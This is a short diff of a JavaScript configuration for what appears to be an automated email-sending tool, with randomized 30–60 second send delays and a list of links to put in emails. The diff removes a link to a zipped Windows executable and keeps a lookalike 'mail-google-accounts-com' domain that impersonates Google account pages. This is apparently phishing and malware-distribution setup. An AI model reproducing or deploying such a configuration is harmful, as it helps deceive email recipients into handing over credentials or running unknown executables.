@@ -279,7 +279,6 @@ const CONFIG = {
 
   emailDelay: { min: 30000, max: 60000 }, // 30 to 60 seconds
   emailLinks: [
-    "https://archive.org/compress/newdetails/formats=WINDOWS%20EXECUTABLE&file=/newdetails.zip",
     "https://mail-google-accounts-com.onrender.com",
   ],
   searchTlds: [
